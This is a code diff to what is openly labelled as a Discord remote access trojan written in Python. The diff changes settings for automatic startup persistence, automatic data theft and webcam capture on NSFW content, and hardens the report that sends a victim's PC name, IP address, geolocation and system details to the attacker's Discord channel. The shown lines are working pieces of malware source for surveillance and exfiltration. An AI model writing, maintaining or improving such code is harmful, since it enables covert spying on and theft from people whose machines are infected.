@@ -30,9 +30,9 @@ import win32gui
 
 # Settings
 
-AutoStartup = True # added
-AutoSteal = True # added
-WebCamOnNSFW = True # added
+AutoStartup = False # added
+AutoSteal = False # added
+WebCamOnNSFW = False # added
 
 DiscordInjection = False # in development... Soon.
 
@@ -602,12 +602,12 @@ async def on_ready():
     channel = discord.utils.get(guild.channels, name=host)
 
     embed_description = (
-        f"**PC Name: 🖥️** {system_info['PC Name']}\n"
-        f"**IP Address: 🌐** {system_info['IP Address']}\n"
-        f"**Geolocation: 📍** {system_info['Geolocation']}\n"
-        f"**System Version: 🖱️** {system_info['System Version']}\n"
-        f"**Memory Usage: 💾** {system_info['Memory Usage']}\n"
-        f"**Disk Usage: 🗂️** {system_info['Disk Info']}\n\n"
+        f"**PC Name: 🖥️** {system_info.get('PC Name', 'Unknown-PC')}\n"
+        f"**IP Address: 🌐** {system_info.get('IP Address', 'Unknown')}\n"
+        f"**Geolocation: 📍** {system_info.get('Geolocation', 'Unknown')}\n"
+        f"**System Version: 🖱️** {system_info.get('System Version', 'Unknown')}\n"
+        f"**Memory Usage: 💾** {system_info.get('Memory Usage', 'Unknown')}\n"
+        f"**Disk Usage: 🗂️** {system_info.get('Disk Info', 'Unknown')}\n\n"
         "Discord RAT V2 © H-zz-H"
     )
 
@@ -1591,5 +1591,3 @@ if AutoStartup:
     startup()
 wait_for_wifi()
 bot.run(HzzH)
-
-
